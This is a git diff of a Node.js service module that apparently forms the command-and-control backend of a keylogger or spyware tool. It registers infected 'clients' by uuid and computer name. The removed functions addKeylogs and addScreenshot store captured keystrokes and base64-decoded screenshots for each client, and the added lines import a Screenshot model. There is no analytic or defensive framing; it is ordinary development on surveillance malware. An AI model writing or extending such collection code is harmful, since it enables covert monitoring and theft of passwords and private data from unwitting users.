@@ -6,6 +6,7 @@ const clientDao = require('../dao/clientDao')
 const { sequelize } = require('../models/Client')
 const keylogsDao = require('../dao/keylogsDao')
 const Keylog = require('../models/Keylog')
+const Screenshot = require('../models/Screenshot')
 const screenshotsDao = require('../dao/ScreenshotsDao')
 //const { now } = require('sequelize/types/lib/utils')
 
@@ -30,65 +31,15 @@ const clientService = {
             uuid: uuid,
             computerName: data.computerName
         })
-
         return client
     },
     update: async function ({ uuid, data }) {
 
-        const client = await clientDao.updateOne({
+        const client = await clientDao.updateOneByUuid({
             uuid: uuid,
             computerName: data.computerName
         })
-
         return client
-    },
-    addKeylogs: async function ({ uuid, data }) {
-
-        const client = await clientDao.findOneByUuid(uuid)
-
-        // If he doesn't exist
-        if (!(client instanceof Client)) {
-            return { isAdded: false }
-        }
-
-        const clientId = client.dataValues.id
-        let isAdded = false
-
-        if (data instanceof Array) {
-            for (const element of data) {
-                const keylogs = await keylogsDao.insertOne({ clientId, element })
-
-                if (keylogs instanceof Keylog)
-                    isAdded = true
-            }
-        }
-
-        return { isAdded: isAdded }
-    },
-    addScreenshot: async function ({ uuid, data }) {
-
-        const client = await clientDao.findOneByUuid(uuid)
-
-        // If he doesn't exist
-        if (!(client instanceof Client)) {
-            return { isAdded: false }
-        }
-
-        const filename = '/screenshots/' + Date.now() + '.jpeg'
-
-        fs.writeFile(filename, Buffer.from(data.screenshot, 'base64'), (err) => {
-            if (err)
-                throw err
-        });
-
-        const clientId = client.dataValues.id
-        const screenshot = await screenshotsDao.insertOne({ clientId, filename })
-
-        if (!(screenshot instanceof Screenshot)) {
-            return { isAdded: false }
-        }
-
-        return { isAdded: true }
     }
 }
 
